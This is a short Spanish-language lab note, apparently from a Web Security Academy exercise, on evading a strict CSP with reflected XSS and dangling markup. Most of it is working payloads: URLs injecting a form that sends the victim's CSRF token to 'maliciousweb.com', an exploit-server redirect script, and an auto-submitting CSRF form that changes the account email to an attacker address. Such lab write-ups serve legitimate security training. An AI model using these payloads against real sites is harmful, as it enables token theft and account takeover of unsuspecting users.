# XSS con CSP estricto y marcado colgante 

Tags: #XSS #XSS-Reflected #CSP 

```javascript 
// CSP contiene las siguientes politicas de bloqueo: 'default-src 'self'; object-src 'none'; script-src 'self'; img-src 'self'; base-uri 'none''


// La verificación del campo inyectable es en la url cuando se esta en la parte del correo 
	http://web.com/my-account?email=prueba
	http://web.com/my-account?email=prueba">      // Cerrar el código y evadir 
	http://web.com/my-account?email=prueba"><script>alert(0)</script>   // Es bloqueado por el CSP

	http://web.com/my-account?email=prueba"></form>

// Este nuevo formulario es agregado al código con el fin de enviar la data a la url maliciosa
	http://web.com/my-account?email=prueba"></form><form class="login_form" name="myform" action="https://maliciousweb.com" method="GET">   

// Esto hará que se transmita el valor del csrf token a la web malicios por el método GET 
	http://web.com/my-account?email=prueba"></form><form class="login_form" name="myform" action="https://maliciousweb.com" method="GET"><button class="button" type="submit">Click me!</button
```

```javascript 
// Dentro del exploit server para obtener el csfr token de la víctima 

	<script>
		location = 'http://web.com/my-account?email=prueba"></form><form class="login_form" name="myform" action="https://maliciousweb.com" method="GET"><button class="button" type="submit">Click me!</button';
	</script>
```

```javascript 
// Hacer que se extraiga el CSRF token y además la cookie de sesión desde el exploit server 

	<html>
	  <body>
	    <form action="https://0ac7001d03cc4e768530088d007d0021.web-security-academy.net/my-account/change-email" method="POST">
	      <input type="hidden" name="email" value="hacker@evil-user.com" />
	      <input type="hidden" name="csrf" value="jGkqfq4asfhFGHGSDt677FGs" />
	      <input type="submit" value="Submit request" />
	    </form>
	    <script>
	      history.pushState('', '', '/');
	      document.forms[0].submit();
	    </script>
	  </body>
	</html>

Notas:
	1. Generar el PoC con BurpSuite Pro 'Click derecho > Engagement tools > Generate CSFR PoC'
	2. Colocar el csrf token de la víctima y el correo a cambiar 
```